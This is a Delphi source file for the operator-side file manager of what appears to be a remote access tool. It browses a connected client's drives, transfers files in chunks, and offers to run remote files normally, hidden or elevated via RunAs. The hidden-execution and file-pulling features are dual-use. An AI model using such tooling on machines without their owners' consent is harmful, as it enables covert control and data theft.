unit UnitFileManager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.Menus, System.JSON, ncLines, System.UITypes, System.NetEncoding, System.IOUtils, System.Generics.Collections,
  Vcl.WinXCtrls;

const
  PACKET_TYPE_FILE_UPLOAD   = $04;
  PACKET_TYPE_FILE_DOWNLOAD = $05;
  FILE_TRANSFER_CHUNK_SIZE  = 64 * 1024;
  FILE_TRANSFER_MAX_SIZE: Int64 = 2147483648;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TSendBinaryProc = procedure(aLine: TncLine; PacketType: Byte; const Data: TBytes) of object;
  TUnregisterFormProc = procedure(aLine: TncLine) of object;

  TForm9 = class(TForm)
    ListView1: TListView;
    Panel1: TPanel;
    StatusBar1: TStatusBar;
    Edit1: TEdit;
    Geri: TButton;
    Yenile: TButton;
    PopupMenu1: TPopupMenu;
    Delete1: TMenuItem;
    Delete2: TMenuItem;
    Download1: TMenuItem;
    NewFolder1: TMenuItem;
    Rename1: TMenuItem;
    Upload1: TMenuItem;
    Copy1: TMenuItem;
    Paste1: TMenuItem;
    Normal1: TMenuItem;
    Normal2: TMenuItem;
    RunAs1: TMenuItem;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    SearchBox1: TSearchBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    procedure Delete1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Normal2Click(Sender: TObject);
    procedure RunAs1Click(Sender: TObject);
    procedure NewFolder1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure Copy1Click(Sender: TObject);
    procedure Paste1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure GeriClick(Sender: TObject);
    procedure YenileClick(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure CheckBox1Click(Sender: TObject);
    procedure CheckBox2Click(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure CheckBox4Click(Sender: TObject);
    procedure CheckBox5Click(Sender: TObject);
    procedure SearchBox1Change(Sender: TObject);
  private
    FLine: TncLine;
    FClientID: string;
    FOnSendJSON: TSendJSONProc;
    FOnSendBinary: TSendBinaryProc;
    FOnUnregister: TUnregisterFormProc;

    FCurrentPath: string;
    FLastStatus: string;
    FLastJSONFiles: TJSONArray;
    FUpdatingCheckBoxes: Boolean;
    FOpenStreams: TDictionary<string, TFileStream>;

    procedure LogToStatus(const Msg: string);
    procedure ApplyLocalFilter;
    procedure Timer1Timer(Sender: TObject);
  public
    procedure SetupForClient(aLine: TncLine; const aClientID: string;
      aSendJSONProc: TSendJSONProc; aSendBinaryProc: TSendBinaryProc; aUnregisterProc: TUnregisterFormProc);
    procedure HandleFileManagerJSON(JSONObj: TJSONObject);
    procedure HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
    procedure DetachCallbacks;
    procedure RequestDrives;
    procedure RequestDirectory(const Path: string);
  end;

var
  Form9: TForm9;

implementation

{$R *.dfm}

type
  TncLineAccess = class(TncLine);

  TPacketHeader = packed record
    Signature  : Word;
    PacketType : Byte;
    Size       : Cardinal;
  end;
const
  FILE_CHUNK_HEADER_SIZE = 29;
  FILE_CHUNK_UPLOAD     = 1;
  FILE_CHUNK_DOWNLOAD   = 2;

function IsFileChunkPayload(const Payload: TBytes): Boolean;
begin
  Result := (Length(Payload) >= FILE_CHUNK_HEADER_SIZE) and
            (Payload[0] = Ord('F')) and (Payload[1] = Ord('M')) and
            (Payload[2] = Ord('C')) and (Payload[3] = Ord('1'));
end;

function ReadUInt32LE(const Buffer: TBytes; Offset: Integer): Cardinal;
begin
  Result := 0;
  if (Offset >= 0) and (Offset + SizeOf(Result) <= Length(Buffer)) then
    Move(Buffer[Offset], Result, SizeOf(Result));
end;

function ReadUInt64LE(const Buffer: TBytes; Offset: Integer): UInt64;
begin
  Result := 0;
  if (Offset >= 0) and (Offset + SizeOf(Result) <= Length(Buffer)) then
    Move(Buffer[Offset], Result, SizeOf(Result));
end;

function BuildFileChunkPayload(OpCode: Byte; const Name: string; Offset,
  TotalSize: UInt64; const Data: TBytes; DataLen: Integer): TBytes;
var
  NameBytes: TBytes;
  NameLen  : Cardinal;
  DataLen32: Cardinal;
begin
  if DataLen < 0 then
    DataLen := 0;
  if DataLen > Length(Data) then
    DataLen := Length(Data);

  NameBytes := TEncoding.UTF8.GetBytes(Name);
  NameLen := Cardinal(Length(NameBytes));
  DataLen32 := Cardinal(DataLen);

  SetLength(Result, FILE_CHUNK_HEADER_SIZE + Integer(NameLen) + DataLen);
  Result[0] := Ord('F');
  Result[1] := Ord('M');
  Result[2] := Ord('C');
  Result[3] := Ord('1');
  Result[4] := OpCode;
  Move(NameLen, Result[5], SizeOf(NameLen));
  Move(Offset, Result[9], SizeOf(Offset));
  Move(TotalSize, Result[17], SizeOf(TotalSize));
  Move(DataLen32, Result[25], SizeOf(DataLen32));
  if NameLen > 0 then
    Move(NameBytes[0], Result[FILE_CHUNK_HEADER_SIZE], NameLen);
  if DataLen > 0 then
    Move(Data[0], Result[FILE_CHUNK_HEADER_SIZE + Integer(NameLen)], DataLen);
end;

procedure SendBinaryPacketDirect(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
var
  Header : TPacketHeader;
  SendBuf: TBytes;
  DataLen: Integer;
begin
  if not Assigned(aLine) then Exit;

  DataLen := Length(Payload);
  Header.Signature := $524E;
  Header.PacketType := PacketType;
  Header.Size := Cardinal(DataLen);

  SetLength(SendBuf, SizeOf(TPacketHeader) + DataLen);
  Move(Header, SendBuf[0], SizeOf(TPacketHeader));
  if DataLen > 0 then
    Move(Payload[0], SendBuf[SizeOf(TPacketHeader)], DataLen);

  TncLineAccess(aLine).SendBuffer(SendBuf[0], Length(SendBuf));
end;

procedure TForm9.SetupForClient(aLine: TncLine; const aClientID: string;
  aSendJSONProc: TSendJSONProc; aSendBinaryProc: TSendBinaryProc; aUnregisterProc: TUnregisterFormProc);
begin
  FLine := aLine;
  FClientID := aClientID;
  FOnSendJSON := aSendJSONProc;
  FOnSendBinary := aSendBinaryProc;
  FOnUnregister := aUnregisterProc;

  Caption := 'File Manager - ' + FClientID;
  FCurrentPath := '';
  if not Assigned(FOpenStreams) then
    FOpenStreams := TDictionary<string, TFileStream>.Create;
  Edit1.Text := '';
  ListView1.Items.Clear;
  FLastStatus := 'Folders [0] Files [0]';
  StatusBar1.SimpleText := FLastStatus;

  // Translation
  Geri.Caption := 'Back';
  // Menu Item Translations
  Delete1.Caption := 'Delete';
  Download1.Caption := 'Download';
  NewFolder1.Caption := 'New Folder';
  Rename1.Caption := 'Rename';
  Upload1.Caption := 'Upload';
  Copy1.Caption := 'Copy';
  Paste1.Caption := 'Paste';
  Normal1.Caption := 'Execute';
  Normal2.Caption := 'Execute (Hidden)';
  RunAs1.Caption := 'Execute (RunAs)';

  Yenile.Caption := 'Refresh';
  // ListView Column Translations
  ListView1.Columns[0].Caption := 'Name';
  ListView1.Columns[1].Caption := 'Date';
  ListView1.Columns[2].Caption := 'Type';
  ListView1.Columns[3].Caption := 'Size';


  OnClose := FormClose;
  Geri.OnClick := GeriClick;
  Yenile.OnClick := YenileClick;
  ListView1.OnDblClick := ListView1DblClick;
  Edit1.OnKeyDown := Edit1KeyDown;

  CheckBox1.Caption := 'List';
  CheckBox2.Caption := 'Grid';
  CheckBox3.Caption := 'All';
  CheckBox4.Caption := 'Dirs';
  CheckBox5.Caption := 'Files';

  FUpdatingCheckBoxes := True;
  try
    CheckBox1.Checked := True;
    CheckBox2.Checked := False;
    CheckBox3.Checked := True;
    CheckBox4.Checked := False;
    CheckBox5.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;

  ListView1.ViewStyle := vsReport;

  CheckBox1.OnClick := CheckBox1Click;
  CheckBox2.OnClick := CheckBox2Click;
  CheckBox3.OnClick := CheckBox3Click;
  CheckBox4.OnClick := CheckBox4Click;
  CheckBox5.OnClick := CheckBox5Click;
  SearchBox1.OnChange := SearchBox1Change;
end;

procedure TForm9.DetachCallbacks;
begin
  FLine := nil;
  FOnSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm9.ApplyLocalFilter;
var
  i: Integer;
  ItemObj: TJSONObject;
  LItem: TListItem;
  FCount, DCount: Integer;
  SearchText: string;
  ShowDirs, ShowFiles: Boolean;
  ItemName, ItemType: string;
begin
  if not Assigned(FLastJSONFiles) then Exit;

  SearchText := Trim(SearchBox1.Text);
  ShowDirs := CheckBox3.Checked or CheckBox4.Checked;
  ShowFiles := CheckBox3.Checked or CheckBox5.Checked;

  ListView1.Items.BeginUpdate;
  try
    ListView1.Items.Clear;
    FCount := 0;
    DCount := 0;

    // First pass: Folders
    for i := 0 to FLastJSONFiles.Count - 1 do
    begin
      ItemObj := FLastJSONFiles.Items[i] as TJSONObject;
      ItemName := ItemObj.Values['name'].Value;
      ItemType := ItemObj.Values['type'].Value;

      if not SameText(ItemType, 'Folder') then Continue;
      if not ShowDirs then Continue;
      if (SearchText <> '') and (Pos(LowerCase(SearchText), LowerCase(ItemName)) <= 0) then Continue;

      LItem := ListView1.Items.Add;
      LItem.Caption := ItemName;
      LItem.SubItems.Add(ItemObj.Values['date'].Value);
      LItem.SubItems.Add(ItemType);
      LItem.SubItems.Add(ItemObj.Values['size'].Value);
      Inc(DCount);
    end;

    // Second pass: Files
    for i := 0 to FLastJSONFiles.Count - 1 do
    begin
      ItemObj := FLastJSONFiles.Items[i] as TJSONObject;
      ItemName := ItemObj.Values['name'].Value;
      ItemType := ItemObj.Values['type'].Value;

      if SameText(ItemType, 'Folder') then Continue;
      if not ShowFiles then Continue;
      if (SearchText <> '') and (Pos(LowerCase(SearchText), LowerCase(ItemName)) <= 0) then Continue;

      LItem := ListView1.Items.Add;
      LItem.Caption := ItemName;
      LItem.SubItems.Add(ItemObj.Values['date'].Value);
      LItem.SubItems.Add(ItemType);
      LItem.SubItems.Add(ItemObj.Values['size'].Value);
      Inc(FCount);
    end;
  finally
    ListView1.Items.EndUpdate;
  end;

  FLastStatus := Format('Folders [%d] Files [%d]', [DCount, FCount]);
  StatusBar1.SimpleText := FLastStatus;
end;

procedure TForm9.CheckBox1Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox1.Checked := True;
    CheckBox2.Checked := False;
    ListView1.ViewStyle := vsReport;
  finally
    FUpdatingCheckBoxes := False;
  end;
end;

procedure TForm9.CheckBox2Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox2.Checked := True;
    CheckBox1.Checked := False;
    ListView1.ViewStyle := vsIcon;
  finally
    FUpdatingCheckBoxes := False;
  end;
end;

procedure TForm9.CheckBox3Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox3.Checked := True;
    CheckBox4.Checked := False;
    CheckBox5.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;
  ApplyLocalFilter;
end;

procedure TForm9.CheckBox4Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox4.Checked := True;
    CheckBox3.Checked := False;
    CheckBox5.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;
  ApplyLocalFilter;
end;

procedure TForm9.CheckBox5Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox5.Checked := True;
    CheckBox3.Checked := False;
    CheckBox4.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;
  ApplyLocalFilter;
end;

procedure TForm9.SearchBox1Change(Sender: TObject);
begin
  ApplyLocalFilter;
end;

procedure TForm9.LogToStatus(const Msg: string);
begin
  // Thread-safe: her zaman main thread'de çalýþtýr
  if GetCurrentThreadId <> MainThreadID then
  begin
    TThread.Queue(nil,
      procedure
      begin
        LogToStatus(Msg);
      end);
    Exit;
  end;

  StatusBar1.SimpleText := Msg;

  TThread.CreateAnonymousThread(
    procedure
    begin
      Sleep(2000);
      TThread.Queue(nil,
        procedure
        begin
          if Assigned(StatusBar1) then
            StatusBar1.SimpleText := FLastStatus;
        end);
    end).Start;
end;

procedure TForm9.Timer1Timer(Sender: TObject);
begin
  // Placeholder for potential future timer logic
end;

procedure TForm9.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) and Assigned(FLine) then
    FOnUnregister(FLine);

  if Assigned(FLastJSONFiles) then
  begin
    FLastJSONFiles.Free;
    FLastJSONFiles := nil;
  end;

  if Assigned(FOpenStreams) then
  begin
    for var FS in FOpenStreams.Values do FS.Free;
    FOpenStreams.Free;
    FOpenStreams := nil;
  end;

  Action := caFree;
end;

procedure TForm9.RequestDrives;
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getdrives');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RequestDirectory(const Path: string);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getfiles');
    JSONObj.AddPair('path', Path);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.HandleFileManagerJSON(JSONObj: TJSONObject);
var
  Action: string;
  Items: TJSONArray;
  i: Integer;
  ItemObj: TJSONObject;
  LItem: TListItem;
  FCount, DCount: Integer;
begin
  if not Assigned(JSONObj) then Exit;

  Action := '';
  if Assigned(JSONObj.Values['type']) then
    Action := JSONObj.Values['type'].Value;

  if SameText(Action, 'drives') then
  begin
    if Assigned(FLastJSONFiles) then
    begin
      FLastJSONFiles.Free;
      FLastJSONFiles := nil;
    end;
    Items := JSONObj.Values['drives'] as TJSONArray;
    ListView1.Items.BeginUpdate;
    try
      ListView1.Items.Clear;
      FCurrentPath := '';
  if not Assigned(FOpenStreams) then
    FOpenStreams := TDictionary<string, TFileStream>.Create;
      Edit1.Text := '';
      for i := 0 to Items.Count - 1 do
      begin
        LItem := ListView1.Items.Add;
        LItem.Caption := Items.Items[i].Value;
        LItem.SubItems.Add(''); // Date
        LItem.SubItems.Add('Drive');
        LItem.SubItems.Add(''); // Size
        LItem.ImageIndex := -1;
      end;
    finally
      ListView1.Items.EndUpdate;
    end;
    FLastStatus := 'Drives listed';
    StatusBar1.SimpleText := FLastStatus;
  end
  else if SameText(Action, 'files') then
  begin
    FCurrentPath := JSONObj.Values['path'].Value;
    Edit1.Text := FCurrentPath;
    Items := JSONObj.Values['files'] as TJSONArray;

    if Assigned(FLastJSONFiles) then FLastJSONFiles.Free;
    FLastJSONFiles := Items.Clone as TJSONArray;

    ApplyLocalFilter;
  end
  else if SameText(Action, 'log') then
  begin
  LogToStatus(JSONObj.Values['message'].Value);
  end
  else if SameText(Action, 'download') then
  begin
    // Legacy Base64 download handler - keeping for compatibility if needed,
    // but binary protocol is preferred now.
    var FileName := JSONObj.Values['name'].Value;
    var Base64Data := JSONObj.Values['data'].Value;
    var RawData: TBytes;
    var SavePath: string;

    RawData := TNetEncoding.Base64.Decode(TEncoding.UTF8.GetBytes(Base64Data));
    SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
    SavePath := TPath.Combine(SavePath, FClientID);
    SavePath := TPath.Combine(SavePath, 'recovery_files');

    if not TDirectory.Exists(SavePath) then
      TDirectory.CreateDirectory(SavePath);

    SavePath := TPath.Combine(SavePath, FileName);

    var MS := TMemoryStream.Create;
    try
      if Length(RawData) > 0 then
        MS.WriteBuffer(RawData[0], Length(RawData));
      MS.SaveToFile(SavePath);
    finally
      MS.Free;
    end;

    LogToStatus('Downloaded: ' + FileName);
  end;
end;

procedure TForm9.HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
begin
  if PacketType = PACKET_TYPE_FILE_DOWNLOAD then
  begin
    if IsFileChunkPayload(Payload) then
    begin
      var OpCode := Payload[4];
      if OpCode <> FILE_CHUNK_DOWNLOAD then Exit;

      var NameLen := Integer(ReadUInt32LE(Payload, 5));
      var Offset := ReadUInt64LE(Payload, 9);
      var TotalSize := ReadUInt64LE(Payload, 17);
      var DataLen := Integer(ReadUInt32LE(Payload, 25));
      var DataOffset := FILE_CHUNK_HEADER_SIZE + NameLen;

      if (NameLen <= 0) or (NameLen > 4096) or
         (DataLen < 0) or (DataLen > FILE_TRANSFER_CHUNK_SIZE) or
         (DataOffset > Length(Payload)) or
         (Length(Payload) - DataOffset < DataLen) or
         (Offset + UInt64(DataLen) > TotalSize) then Exit;

      var FileName := TEncoding.UTF8.GetString(Payload, FILE_CHUNK_HEADER_SIZE, NameLen);
      FileName := TPath.GetFileName(FileName);
      if FileName = '' then Exit;

      var SaveDir := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
      SaveDir := TPath.Combine(SaveDir, FClientID);
      SaveDir := TPath.Combine(SaveDir, 'recovery_files');

      if not TDirectory.Exists(SaveDir) then
        TDirectory.CreateDirectory(SaveDir);

      var SavePath := TPath.Combine(SaveDir, FileName);
      var PartPath := SavePath + '.part';

      try
        var FS: TFileStream;
        if Offset = 0 then
        begin
          if FOpenStreams.TryGetValue(PartPath, FS) then
          begin
            FOpenStreams.Remove(PartPath);
            FS.Free;
          end;
          if TFile.Exists(PartPath) then TFile.Delete(PartPath);
        end;

        if not FOpenStreams.TryGetValue(PartPath, FS) then
        begin
          var Mode: Word;
          if TFile.Exists(PartPath) then
            Mode := fmOpenReadWrite or fmShareDenyWrite
          else
            Mode := fmCreate or fmShareDenyWrite;
          FS := TFileStream.Create(PartPath, Mode);
          FOpenStreams.Add(PartPath, FS);
        end;

        FS.Position := Int64(Offset);
        if DataLen > 0 then
          FS.WriteBuffer(Payload[DataOffset], DataLen);

        if Offset + UInt64(DataLen) >= TotalSize then
        begin
          FS.Size := Int64(TotalSize);
          FOpenStreams.Remove(PartPath);
          FS.Free;

          if TFile.Exists(SavePath) then
            TFile.Delete(SavePath);
          TFile.Move(PartPath, SavePath);
          TThread.Queue(nil, procedure begin LogToStatus('Downloaded: ' + FileName + ' (' + IntToStr(Int64(TotalSize)) + ' bytes)'); end);
        end
        else if (Offset = 0) or (((Offset + UInt64(DataLen)) mod (1024 * 1024)) < UInt64(DataLen)) then
          TThread.Queue(nil, procedure begin LogToStatus('Downloading: ' + FileName + ' ' + IntToStr(Int64(Offset + UInt64(DataLen))) + '/' + IntToStr(Int64(TotalSize)) + ' bytes'); end);
      except
        on E: Exception do
          TThread.Queue(nil, procedure begin LogToStatus('Download error: ' + E.Message); end);
      end;
      Exit;
    end;

    if Length(Payload) < 4 then Exit;

    var NameLen: Integer;
    Move(Payload[0], NameLen, 4);

    if (NameLen <= 0) or (NameLen > 2048) or (Length(Payload) < (4 + NameLen)) then Exit;

    var FileName: string;
    FileName := TEncoding.UTF8.GetString(Payload, 4, NameLen);

    FileName := TPath.GetFileName(FileName);
    if FileName = '' then Exit;

    var FileDataLen := Length(Payload) - 4 - NameLen;
    var SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
    SavePath := TPath.Combine(SavePath, FClientID);
    SavePath := TPath.Combine(SavePath, 'recovery_files');

    if not TDirectory.Exists(SavePath) then
      TDirectory.CreateDirectory(SavePath);

    SavePath := TPath.Combine(SavePath, FileName);

    TThread.CreateAnonymousThread(
      procedure
      begin
        var MS := TMemoryStream.Create;
        try
          if FileDataLen > 0 then
            MS.WriteBuffer(Payload[4 + NameLen], FileDataLen);
          MS.SaveToFile(SavePath);
          TThread.Queue(nil,
            procedure
            begin
              LogToStatus('Downloaded (Legacy Binary): ' + FileName);
            end);
        finally
          MS.Free;
        end;
      end).Start;
  end;
end;
procedure TForm9.GeriClick(Sender: TObject);
var
  P: string;
begin
  if (FCurrentPath = '') or (Length(FCurrentPath) <= 3) then
  begin
    RequestDrives;
    Exit;
  end;

  P := ExcludeTrailingPathDelimiter(FCurrentPath);
  P := ExtractFilePath(P);

  if (P = '') or (Length(P) < 2) then
    RequestDrives
  else
    RequestDirectory(P);
end;

procedure TForm9.YenileClick(Sender: TObject);
begin
  LogToStatus('Refreshing...');   // <-- ekle
  if FCurrentPath = '' then
    RequestDrives
  else
    RequestDirectory(FCurrentPath);
end;

procedure TForm9.ListView1DblClick(Sender: TObject);
var
  LItem: TListItem;
  Name, FType: string;
begin
  LItem := ListView1.Selected;
  if not Assigned(LItem) then Exit;

  Name := LItem.Caption;
  FType := LItem.SubItems[1];

  if SameText(FType, 'Drive') then
    RequestDirectory(Name)
  else if SameText(FType, 'Folder') then
    RequestDirectory(IncludeTrailingPathDelimiter(FCurrentPath) + Name)
  else
  begin
    // It's a file, default action: Normal Execute
    Normal1Click(nil);
  end;
end;

procedure TForm9.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    if Trim(Edit1.Text) = '' then
      RequestDrives
    else
      RequestDirectory(Edit1.Text);
  end;
end;

procedure TForm9.Copy1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'copyfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Copied to clipboard');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Delete1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  if MessageDlg('Are you sure you want to delete this?', mtConfirmation, [mbYes, mbNo], 0) <> mrYes then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'deletefile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Deleting: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Download1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'downloadfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Downloading: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;
procedure TForm9.NewFolder1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  FolderName: string;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  FolderName := InputBox('New Folder', 'Enter folder name:', 'New Folder');
  if FolderName = '' then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'createfolder');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + FolderName);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Creating folder...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'normal');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing: ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'hidden');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing (Hidden): ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Paste1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'pastefile');
    JSONObj.AddPair('path', FCurrentPath);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Pasting file...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Rename1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  NewName: string;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  NewName := InputBox('Rename', 'Enter new name:', ListView1.Selected.Caption);
  if (NewName = '') or (NewName = ListView1.Selected.Caption) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'rename');
    JSONObj.AddPair('oldpath', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('newpath', IncludeTrailingPathDelimiter(FCurrentPath) + NewName);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Renaming: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RunAs1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'runas');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing (RunAs): ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Upload1Click(Sender: TObject);
var
  OpenDlg: TOpenDialog;
  FileName: string;
  DestPath: string;
  SourcePath: string;
  SourceSize: Int64;
  LLine: TncLine;
begin
  if not Assigned(FLine) then Exit;

  OpenDlg := TOpenDialog.Create(nil);
  try
    if OpenDlg.Execute then
    begin
      SourcePath := OpenDlg.FileName;
      SourceSize := TFile.GetSize(SourcePath);
      if SourceSize > FILE_TRANSFER_MAX_SIZE then
      begin
        MessageBox(Handle, 'File size exceeds 2GB limit.', 'Upload Error', MB_OK or MB_ICONERROR);
        Exit;
      end;

      FileName := TPath.GetFileName(SourcePath);
      DestPath := IncludeTrailingPathDelimiter(FCurrentPath) + FileName;
      LLine := FLine;
      LogToStatus('Uploading: ' + FileName + '...');

      TThread.CreateAnonymousThread(
        procedure
        var
          FS: TFileStream;
          Chunk: TBytes;
          Payload: TBytes;
          ReadLen: Integer;
          Offset: UInt64;
        begin
          try
            Offset := 0;
            SetLength(Chunk, FILE_TRANSFER_CHUNK_SIZE);

            FS := TFileStream.Create(SourcePath, fmOpenRead or fmShareDenyWrite);
            try
              repeat
                ReadLen := FS.Read(Chunk[0], Length(Chunk));
                if (ReadLen > 0) or (SourceSize = 0) then
                begin
                  Payload := BuildFileChunkPayload(FILE_CHUNK_UPLOAD, DestPath, Offset,
                    UInt64(SourceSize), Chunk, ReadLen);
                  if Assigned(FOnSendBinary) then
                    FOnSendBinary(LLine, PACKET_TYPE_FILE_UPLOAD, Payload);
                  Sleep(5);
                end;
                Inc(Offset, UInt64(ReadLen));
              until ReadLen = 0;
            finally
              FS.Free;
            end;

            TThread.Queue(nil,
              procedure
              begin
                if Assigned(StatusBar1) then
                  LogToStatus('Upload sent: ' + FileName);
              end);
          except
            on E: Exception do
              TThread.Queue(nil, procedure begin LogToStatus('Upload error: ' + E.Message); end);
          end;
        end).Start;
    end;
  finally
    OpenDlg.Free;
  end;
end;
end.

